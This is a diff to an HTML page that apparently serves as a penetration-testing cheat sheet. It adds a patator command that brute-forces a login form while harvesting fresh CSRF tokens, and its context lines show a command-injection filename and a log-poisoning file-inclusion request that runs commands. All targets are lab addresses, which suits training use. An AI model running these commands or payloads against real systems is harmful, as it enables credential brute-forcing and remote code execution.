@@ -1049,8 +1049,24 @@ file`whoami`.jpg</code></pre>
                                     <p>Then send the request </p>
                                     <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/log/apache2/access.log&cmd=id</code></pre>
                                 </ul>
-
+                                </ul>
                             </ul>
+
+                            <h2 id="Bypassing CSRF mitigations">Bypassing CSRF mitigations</h2>
+                                <ul>
+                                    <p>In case you found out a login system that uses CSRF tokens we could use a tool called potator in order to generate new tokens for every request during a brute force attacks</p>
+                                    <p>The following shows the command to use</p>
+                                    <pre><code class="language-bash">patator http_fuzz \
+    url=http://192.168.50.11/project/index.php/login \
+    method=POST \
+    body='login[_csrf_token]=_TOKEN_&login[email]=FILE0&login[password]=FILE1&http_referer=' \
+    0=emails.txt \
+    1=wordlist.txt \
+    before_urls=http://192.168.50.11/project/index.php/login \
+    before_egrep='_TOKEN_:name="login\[_csrf_token\]"[^>]*value="([^"]*)"' \
+    accept_cookie=1 \
+    follow=0 \
+    -x ignore:clen=116</code></pre>
                     </div>
                 </ul>
             </div>
